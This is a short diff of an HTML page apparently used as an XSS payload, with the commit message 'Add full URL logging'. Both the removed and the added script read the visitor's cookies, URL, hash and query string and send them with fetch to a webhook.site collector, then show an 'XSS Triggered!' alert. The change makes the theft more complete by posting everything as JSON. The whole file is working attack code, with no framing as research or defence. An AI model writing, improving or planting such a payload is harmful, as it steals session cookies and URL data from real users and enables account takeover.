@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html><body><script>
-fetch('https://webhook.site/36492fad-08fc-4f8b-b84e-03ec9bd9e157?cookie='+encodeURIComponent(document.cookie)+'&hash='+encodeURIComponent(location.hash)+'&url='+encodeURIComponent(location.href));
-alert('XSS Triggered! URL: '+location.href);
+var fullUrl = location.href;
+var cookies = document.cookie;
+var hash = location.hash;
+var search = location.search;
+
+fetch('https://webhook.site/36492fad-08fc-4f8b-b84e-03ec9bd9e157', {
+  method: 'POST',
+  body: JSON.stringify({
+    url: fullUrl,
+    cookie: cookies,
+    hash: hash,
+    search: search
+  }),
+  headers: { 'Content-Type': 'application/json' }
+});
+
+alert('XSS Triggered!\\nURL: ' + fullUrl);
 </script></body></html>
 Add full URL logging
